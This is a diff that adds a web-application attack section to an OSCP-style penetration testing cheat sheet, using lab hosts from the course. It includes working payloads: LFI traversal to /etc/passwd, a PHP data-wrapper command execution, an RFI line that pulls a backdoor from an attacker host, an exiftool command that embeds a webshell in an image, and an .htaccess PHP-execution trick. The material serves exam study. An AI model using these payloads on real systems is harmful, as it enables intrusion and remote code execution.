@@ -13,6 +13,92 @@ Curated from the OSCP Assessment Template with added quick wins for both Linux a
 - `nikto -h http://<host>` – Catch obvious web misconfigurations.
 - `zap-baseline.py -t http://<host>` – Rapid OWASP ZAP passive scan for easy findings.
 
+## Web Application Testing
+### Web Enumeration Examples
+- `sudo nmap -p80  -sV 192.168.50.20` – Identify web server version.
+- `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5` – Discover hidden directories.
+- `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,txt,html -t 10` – Deeper directory enumeration.
+-  Debug Page Content: Look for comments, hidden fields, or debug info in HTML source.
+-  Enumerate API:
+   * patterns
+    ```bash
+    {GOBUSTER}/v1
+    {GOBUSTER}/v2
+    ```
+   - `gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern` – Fuzz for API endpoints.
+ - `curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login` – Test API login functionality.
+   - If logoin successful, you should receive a token like below:
+    ```bash
+    kali@kali:~$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+
+     {"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
+
+    kali@kali:~$ curl  \
+    'http://192.168.50.16:5002/users/v1/admin/password' \
+    -H 'Content-Type: application/json' \
+    -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
+    -d '{"password": "pwned"}'
+
+    {
+    "detail": "The method is not allowed for the requested URL.",
+    "status": 405,
+    "title": "Method Not Allowed",
+    "type": "about:blank"
+    }
+    
+    ```
+- Check cross-site scripting stored or reflected 
+    * https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626
+    * XSS simple payload : https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/#tools
+    * XSS Polyglot : https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/2%20-%20XSS%20Polyglot/
+- .htaccess upload to restrict access to certain files https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/
+  
+  - .htaccess file 
+    ```bash
+    # .htaccess
+    <FilesMatch "\.(php|php5|phtml|html|htm|js|css|exe|pl|py|sh|rb|cgi)$">
+    Order Allow,Deny
+    Deny from all
+    </FilesMatch>
+
+    AddType application/x-httpd-php .htaccess
+    ```
+
+### Webshells
+
+- PHP windows reverse shell https://github.com/Dhayalanb/windows-php-reverse-shell
+
+### Web Exploitation
+
+- Local File Inclusion (LFI) to Remote Code Execution (RCE) example (find application config for password, upload webshell, user enumeration, ssh private):
+  - `http://<target>/index.php?page=../../../../etc/passwd` – Test for LFI vulnerability. (log poison if possible)
+- PHP wrapper
+  - Data rapper : `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`
+  - Php rapper : `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`
+- Remote File Inclusion (RFI) example:
+  - `curl "http://mountaindesserts.com/meteor/index.php?page=http://<attacker ip>/simple-backdoor.php&cmd=ls"` – Host a simple webshell on your machine.
+- File upload:
+    - upload ssh key to web server
+        ```bash
+        kali@kali:~$ ssh-keygen
+        Generating public/private rsa key pair.
+        Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
+        Enter passphrase (empty for no passphrase): 
+        Enter same passphrase again: 
+        Your identification has been saved in fileup
+        Your public key has been saved in fileup.pub
+        ...
+
+        kali@kali:~$ cat fileup.pub > authorized_keys
+        ```
+    - upload php webshell to web server 
+      - https://revshells.com/
+    - upload hidden webshell in image file
+      - https://github.com/convisolabs/CVE-2021-22204-exiftool/blob/master/exploit.py
+      - `exiftool -comment='<?php system($_GET["cmd"]); ?>' image.jpg` – Embed PHP webshell in image metadata.
+- Command Injection
+  - `http://<target>/index.php?page=ping&ip=
+  - find exploitable parameter in the web request that passes user input to system commands.
 ## Host Enumeration – Linux
 - `uname -a` – Kernel and architecture info.
 - `hostnamectl` – Hostname, OS, and hardware summary.
